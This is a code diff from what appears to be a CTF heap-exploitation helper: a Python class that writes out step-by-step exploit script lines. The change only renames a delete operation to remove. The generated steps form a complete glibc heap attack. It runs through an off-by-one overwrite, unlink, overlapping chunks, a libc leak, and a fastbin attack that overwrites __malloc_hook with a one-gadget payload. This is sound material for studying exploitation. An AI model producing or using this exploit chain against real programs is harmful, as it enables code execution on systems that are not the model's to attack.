@@ -67,9 +67,9 @@ class OffByOne(object):
             idx = next_idx()
             self.operations.append("add(io, %s, %s) # %d"%(hex(size), content, idx))
             return idx
-        def op_del(idx):
+        def op_remove(idx):
             used_idxs.remove(idx)
-            self.operations.append("delete(io, %d)"%(idx))
+            self.operations.append("remove(io, %d)"%(idx))
         # self.operations.append("# you should leak libc first\n")
         if self.vuln_idx == 1:
         # prepare chunks
@@ -81,27 +81,27 @@ class OffByOne(object):
                     for i in range(2):
                         tx.append(op_add(const_size-8, 'aaa'))
                 for t in tx:
-                    op_del(t)
+                    op_remove(t)
                 self.operations.append("# now const_size fastbin have some chunks\n")
             a = op_add(0x100-8, '"aaa"')
             b = op_add(0x70-8, '"bbb"')
             c = op_add(0x100-8, '"ccc"')
             d = op_add(0x70-8, '"ddd"')
-            op_del(a)
-            op_del(b)
+            op_remove(a)
+            op_remove(b)
             self.operations.append("\n# off-by-one")
             b = op_add(0x70-8, "'a'*0x60 + p64("+hex(0x170)+")")
             self.operations.append("\n# unlink")
-            op_del(c)
+            op_remove(c)
             self.operations.append("\n# overlap")
             a = op_add(0x100-8, '"aaa"')
             self.operations.append("\n# now you can show %d to leak libc\n"%(b))
             e = op_add(0x70-8, '"eee"')
             self.operations.append("# now %d and %d pointer to same addr"%(b, e))
             self.operations.append("\n# fastbin attack")
-            op_del(b)
-            op_del(d)
-            op_del(e)
+            op_remove(b)
+            op_remove(d)
+            op_remove(e)
             self.operations.append("\n# you should check the fast bin :P")
             self.operations.append("fake = libc.symbols['__malloc_hook'] - 0x23 # malloc hook ")
             self.operations.append("payload = \"a\"*19 + p64(one)")
